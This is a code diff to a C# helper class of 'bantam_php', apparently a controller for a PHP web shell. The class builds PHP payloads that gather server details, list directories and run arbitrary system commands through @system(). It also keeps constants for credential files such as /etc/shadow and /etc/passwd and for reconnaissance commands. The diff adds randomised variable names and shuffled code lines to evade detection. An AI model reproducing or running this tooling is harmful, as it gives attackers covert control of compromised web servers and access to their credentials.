@@ -39,23 +39,46 @@ namespace bantam_php
         /// </summary>
         public const string colSeperator = ",.$.,";
 
-        public static string linuxFS_ShadowFile = "/etc/shadow";
-        public static string linuxFS_PasswdFile = "/etc/passwd";
-        public static string linuxFS_IssueFile = "/etc/issue.net";
-        public static string linuxFS_hostTargetsFile = "/etc/hosts";
-        public static string linuxFS_ProcVersion = "/proc/version";
-        public static string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
+        /// <summary>
+        /// Linux File Locations
+        /// </summary>
+        public static string linuxFS_ShadowFile         = "/etc/shadow";
+        public static string linuxFS_PasswdFile         = "/etc/passwd";
+        public static string linuxFS_IssueFile          = "/etc/issue.net";
+        public static string linuxFS_hostTargetsFile    = "/etc/hosts";
+        public static string linuxFS_ProcVersion        = "/proc/version";
+        public static string linuxFS_NetworkInterfaces  = "/etc/network/interfaces";
 
+        /// <summary>
+        /// Windows File Locations
+        /// </summary>
         public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
 
-        public static string linuxOS_PsAux = "ps aux";
-        public static string linuxOS_Ifconfig = "ifconfig";
-        public static string windowsOS_Ipconfig = "ipconfig";
-        public static string windowsOS_TaskList = "tasklist";
-        public static string windowsOS_NetUser = "net user";
-        public static string windowsOS_NetAccounts = "net accounts";
-        public static string windowsOS_Ver = "ver";
-        public static string posixOS_Whoami = "whoami";
+        /// <summary>
+        /// OS Commands
+        /// </summary>
+        public static string linuxOS_PsAux          = "ps aux";
+        public static string linuxOS_Ifconfig       = "ifconfig";
+        public static string windowsOS_Ipconfig     = "ipconfig";
+        public static string windowsOS_TaskList     = "tasklist";
+        public static string windowsOS_NetUser      = "net user";
+        public static string windowsOS_NetAccounts  = "net accounts";
+        public static string windowsOS_Ver          = "ver";
+        public static string posixOS_Whoami         = "whoami";
+
+        public static void ShuffleList<T>(IList<T> list)
+        {
+            Random random = new Random();
+            int n = list.Count;
+
+            for (int i = list.Count - 1; i > 1; i--) {
+                int rnd = random.Next(i + 1);
+
+                T value = list[rnd];
+                list[rnd] = list[i];
+                list[i] = value;
+            }
+        }
 
         /// <summary>
         /// 
@@ -63,63 +86,85 @@ namespace bantam_php
         /// 
         public static string InitShellData(bool encryptResponse)
         {
-            string responseCode = "";
+            string osVar = EncryptionHelper.RandomPHPVar();
+            string cwdVar = EncryptionHelper.RandomPHPVar();
+            string freespaceVar = EncryptionHelper.RandomPHPVar();
+            string totalfreespaceVar = EncryptionHelper.RandomPHPVar();
+            string releaseVar = EncryptionHelper.RandomPHPVar();
+            string kernelVar = EncryptionHelper.RandomPHPVar();
+            string serverIpVar = EncryptionHelper.RandomPHPVar();
+            string serverSoftwareVar = EncryptionHelper.RandomPHPVar();
+            string userVar = EncryptionHelper.RandomPHPVar();
+            string uidVar = EncryptionHelper.RandomPHPVar();
+            string gidVar = EncryptionHelper.RandomPHPVar();
+            string groupVar = EncryptionHelper.RandomPHPVar();
+            string phpVersionVar = EncryptionHelper.RandomPHPVar();
+
+            string responseCode = string.Empty;
+            string linesRandomized = string.Empty;
+
+            List<string> lines = new List<string> {
+                osVar + " = 'nix'; if (strtolower(substr(PHP_OS, 0, 3)) == 'win'){ " + osVar + " = 'win';}",
+                freespaceVar + " = @diskfreespace(" + cwdVar + ");",
+                cwdVar + " = dirname(__FILE__);",
+                totalfreespaceVar + " = @disk_total_space(" + cwdVar + ");",
+                totalfreespaceVar + " = " + totalfreespaceVar + " ? " + totalfreespaceVar + " : 1;",
+                releaseVar + " = @php_uname('r');",
+                kernelVar + " = @php_uname('s');",
+                serverIpVar + " = $_SERVER['SERVER_ADDR'];",
+                serverSoftwareVar + " = @getenv('SERVER_SOFTWARE');",
+                phpVersionVar + @" = phpversion();"
+            };
+
+            ShuffleList(lines);
+            //lines.ShuffleList();
+
             if (encryptResponse) {
-                responseCode = @"$result = $os.'" + colSeperator
-                     + "'.$cwd.'" + colSeperator
-                     + "'.$freeSpace.'" + colSeperator
-                     + "'.$totalSpace.'" + colSeperator
-                     + "'.$release.'" + colSeperator
-                     + "'.$kernel.'" + colSeperator
-                     + "'.$serverIP.'" + colSeperator
-                     + "'.$serverSoftware.'" + colSeperator
-                     + "'.$user.'" + colSeperator
-                     + "'.$uid.'" + colSeperator
-                     + "'.$gid.'" + colSeperator
-                     + "'.$group.'" + colSeperator
-                     + "'.$phpVersion;";
+                responseCode = "$result = " + osVar + ".'" + colSeperator
+                     + "'." + cwdVar + ".'" + colSeperator
+                     + "'." + freespaceVar + ".'" + colSeperator
+                     + "'." + totalfreespaceVar + ".'" + colSeperator
+                     + "'." + releaseVar + ".'" + colSeperator
+                     + "'."+ kernelVar + ".'" + colSeperator
+                     + "'." + serverIpVar + ".'" + colSeperator
+                     + "'."+ serverSoftwareVar + ".'" + colSeperator
+                     + "'."+ userVar + ".'" + colSeperator
+                     + "'."+ uidVar + ".'" + colSeperator
+                     + "'."+ gidVar + ".'" + colSeperator
+                     + "'."+ groupVar + ".'" + colSeperator
+                     + "'."+ phpVersionVar + ";";
             } else {
-                responseCode = @"echo $os.'" + colSeperator
-                     + "'.$cwd.'" + colSeperator
-                     + "'.$freeSpace.'" + colSeperator
-                     + "'.$totalSpace.'" + colSeperator
-                     + "'.$release.'" + colSeperator
-                     + "'.$kernel.'" + colSeperator
-                     + "'.$serverIP.'" + colSeperator
-                     + "'.$serverSoftware.'" + colSeperator
-                     + "'.$user.'" + colSeperator
-                     + "'.$uid.'" + colSeperator
-                     + "'.$gid.'" + colSeperator
-                     + "'.$group.'" + colSeperator
-                    + "'.$phpVersion;";
+                responseCode = "echo " + osVar + ".'" + colSeperator
+                     + "'." + cwdVar + ".'" + colSeperator
+                     + "'." + freespaceVar + ".'" + colSeperator
+                     + "'." + totalfreespaceVar + ".'" + colSeperator
+                     + "'." + releaseVar + ".'" + colSeperator
+                     + "'."+ kernelVar + ".'" + colSeperator
+                     + "'."+ serverIpVar + ".'" + colSeperator
+                     + "'."+ serverSoftwareVar + ".'" + colSeperator
+                     + "'."+ userVar + ".'" + colSeperator
+                     + "'."+ uidVar + ".'" + colSeperator
+                     + "'."+ gidVar + ".'" + colSeperator
+                     + "'."+ groupVar + ".'" + colSeperator
+                    + "'."+ phpVersionVar + ";";
             }
 
-            return @"
-                $os = 'nix';
-                if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $os = 'win'; }
-                $cwd = @dirname(__FILE__);
-                $freeSpace  = @diskfreespace($cwd);
-                $totalSpace = @disk_total_space($cwd);
-                $totalSpace = $totalSpace ? $totalSpace : 1;
-                $release	= @php_uname('r');
-                $kernel	 = @php_uname('s');
-                $serverIP =  $_SERVER['SERVER_ADDR'];
-                $serverSoftware = @getenv('SERVER_SOFTWARE');
-                $phpVersion = phpversion();
-		
-                if (!function_exists('posix_getegid')) {
-	                $user  = @get_current_user();
-	                $uid   = @getmyuid();
-	                $gid   = @getmygid();
-	                $group = '?';
+            foreach(var line in lines) {
+                linesRandomized += line;
+            }
+          
+            return linesRandomized + "if (!function_exists('posix_getegid')) {"
+	                + userVar + " = @get_current_user();"
+	                + uidVar + " = @getmyuid();"
+	                + gidVar + " = @getmygid();"
+	                + groupVar + @" = '?';
                 } else {
-	                $uid   = @posix_getpwuid(posix_geteuid());
-	                $gid   = @posix_getgrgid(posix_getegid());
-
-	                $user  = $uid['name'];
-	                $uid   = $uid['uid'];
-	                $gid   = $gid['gid'];
-	                $group = $gid['name'];
+	                "+ uidVar + " = @posix_getpwuid(posix_geteuid());"
+	                + gidVar + " = @posix_getgrgid(posix_getegid());"
+	                + userVar + "= "+ uidVar + "['name'];"
+	                + uidVar + " = "+ uidVar + "['uid'];"
+	                + gidVar + " = "+ gidVar + "['gid'];"
+	                + groupVar + " = "+ gidVar + @"['name'];
                 }" + responseCode;
         }
 
@@ -132,7 +177,7 @@ namespace bantam_php
         public static string PhpInfo(bool encryptResponse)
         {
             if (encryptResponse) {
-                return "ob_start(); phpinfo(); $result = ob_get_contents(); ob_end_clean();";
+                return "@ob_start(); @phpinfo(); $result = @ob_get_contents(); @ob_end_clean();";
             } else {
                 return "phpinfo();";
             }
@@ -145,7 +190,7 @@ namespace bantam_php
         /// <returns></returns>
         public static string PhpTestExecutionWithEcho(bool encryptReponse)
         {
-            string phpTestExecutionWithEcho = "";
+            string phpTestExecutionWithEcho = string.Empty;
             if (encryptReponse) {
                 phpTestExecutionWithEcho = "$result = '1';";
 
@@ -162,7 +207,7 @@ namespace bantam_php
         /// <returns></returns>
         public static string OsDetectPhp(bool encryptResponse)
         {
-            string osDetectPHP = "";
+            string osDetectPHP = string.Empty;
             if (encryptResponse) {
                 osDetectPHP = "$result; if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $result = 'win'; } else { $result = 'nix'; }";
             } else {
@@ -179,11 +224,13 @@ namespace bantam_php
         /// <returns></returns>
         public static string GetHardDriveLettersPhp(bool encryptResponse)
         {
-            string getHardDriveLetters = "";
+            string getHardDriveLetters = string.Empty;
+            string driveVar = EncryptionHelper.RandomPHPVar();
+
             if (encryptResponse) {
-                getHardDriveLetters = "$result; foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { $result .= $drive.':|'; }}";
+                getHardDriveLetters = "$result; foreach (range('a', 'z') as " + driveVar + ") { if (is_dir(" + driveVar + " . ':\\')) { $result .= " + driveVar + ".':|'; }}";
             } else {
-                getHardDriveLetters = "foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { echo $drive.':|'; }}";
+                getHardDriveLetters = "foreach (range('a', 'z') as " + driveVar + ") { if (is_dir(" + driveVar + " . ':\\')) { echo " + driveVar + ".':|'; }}";
             }
             return getHardDriveLetters;
         }
@@ -238,7 +285,7 @@ namespace bantam_php
         public static string ExecuteSystemCode(string code, bool encryptResponse)
         {
             if (encryptResponse) {
-                return @"ob_start(); @system('" + code + "'); $result = ob_get_contents(); ob_end_clean();";
+                return "@ob_start(); @system('" + code + "'); $result = @ob_get_contents(); @ob_end_clean();";
             } else {
                 return "@system('" + code + "');";
             }
@@ -252,99 +299,48 @@ namespace bantam_php
         /// <returns></returns>
         public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
         {
-            //We cannot use the lambda function in usort below php version 5.2 :(
-            //TODO move this version holder / checker else where to a function
-            string sortCode = "";
-            string[] version = phpVersion.Split(new string[] { "." }, StringSplitOptions.None);
-            if (version != null && version.Length >= 2) {
-                if (Convert.ToInt32(version[0]) > 5
-                || (Convert.ToInt32(version[0]) == 5 && Convert.ToInt32(version[1]) >= 3)) {
-                    sortCode =
-                    @"if (!empty($dirs)) {
-                        usort($dirs, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
-                    }
+            string varItem = EncryptionHelper.RandomPHPVar();
+            string varFile = EncryptionHelper.RandomPHPVar();
 
-                    if (!empty($files)) {
-                        usort($files, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
-                    }";
-                }
-            }
-
-            string responseCode = "";
             if (responseEncryption) {
-                responseCode = @"$result; foreach ($dirs as $dir) {
-                    $result .= $dir['name']. '" + colSeperator
-                   + @"'.$dir['path'].'" + colSeperator
-                   + @"'.$dir['size'].'" + colSeperator
-                   + @"'.$dir['type'].'" + colSeperator
-                   + @"'.$dir['perms'].'" + rowSeperator + @"';
-                    }
-                    foreach($files as $file) {
-                        $result .= $file['name'] . '" + colSeperator
-                   + "'.$file['path'].'" + colSeperator
-                   + "'.$file['size'].'" + colSeperator
-                   + "'.$file['type'].'" + colSeperator
-                   + "'.$dir['perms'].'" + rowSeperator + @"';
-                    }";
-            } else {
-                responseCode = @"foreach($dirs as $dir) {
-                    echo $dir['name']. '" + colSeperator
-                   + @"'.$dir['path'].'" + colSeperator
-                   + @"'.$dir['size'].'" + colSeperator
-                   + @"'.$dir['type'].'" + colSeperator
-                   + @"'.$dir['perms'].'" + rowSeperator + @"';
-                    }
-                    foreach($files as $file) {
-                        echo $file['name'] . '" + colSeperator
-                   + "'.$file['path'].'" + colSeperator
-                   + "'.$file['size'].'" + colSeperator
-                   + "'.$file['type'].'" + colSeperator
-                   + "'.$file['perms'].'" + rowSeperator + @"';
-                    }";
-            }
-
-            return @"$dirs = $files = array();
-	             function PermsColor($f) {
-		            if (!@is_readable($f)) {
+                return @"$result; function PermsColor(" + varFile + @") {
+		            if (!@is_readable(" + varFile + @")) {
 			            return 'red';
-		            } elseif (!@is_writable($f)) {
+		            } elseif (!@is_writable(" + varFile + @")) {
 			            return 'grey';
 		            } else {
 			            return 'green';
                     }
 	            }
                 try{ 
-                    foreach (new DirectoryIterator('" + location + @"') as $item) {
-			            if($item->getBasename() == '.') {
-				            continue;
-			            }
-
-			            $tmp = array(
-				            'name' => $item->getBasename(),
-				            'path' => $item->getPath() . '/' . $item->getBasename(),
-                            'perms' => PermsColor($item->getPathname())
-			            );
-
-			            if ($item->isFile()) {
-				            array_push($files, array_merge($tmp, array(
-					            'type' => 'file',
-                                'size' => $item->getSize()
-				            )));
-			            }
-			            elseif ($item->isLink()) {
-				            array_push($dirs, array_merge($tmp, array(
-					            'type' => 'link',
-                                'size' => ''
-				            )));
-			            }
-			            elseif ($item->isDir()) {
-				            array_push($dirs, array_merge($tmp, array(
-					            'type' => 'dir',
-                                'size' => ''
-				            )));
-			            }
-		            }" + sortCode + responseCode + @"
+                    foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {
+			            $result .= " + varItem + "->getBasename().'" + colSeperator + "'."
+                                     + varItem + "->getPath().'" + colSeperator + "'."
+                                     + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
+                                     + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
+                                     + "PermsColor(" + varItem + @"->getPathname()).'" + rowSeperator + @"';
+		            }
                 }catch(Exception $e){  }";
+            } else {
+                return @"function PermsColor(" + varFile + @") {
+		            if (!@is_readable(" + varFile + @")) {
+			            return 'red';
+		            } elseif (!@is_writable(" + varFile + @")) {
+			            return 'grey';
+		            } else {
+			            return 'green';
+                    }
+	            }
+                try{ 
+                    foreach (new DirectoryIterator('" + location + @"') as " + varItem + @") {
+			            echo " + varItem + "->getBasename().'" + colSeperator + "'."
+                               + varItem + "->getPath().'" + colSeperator + "'."
+                               + "((" + varItem + "->isFile()) ? " + varItem + "->getSize() : '').'" + colSeperator + "'."
+                               + "((" + varItem + "->isFile()) ? 'file' : 'dir').'" + colSeperator + "'."
+                               + "PermsColor(" + varItem + @"->getPathname()).'" + rowSeperator + @"';
+		            }
+                }catch(Exception $e){  }";
+            }
         }
 
         /// <summary>
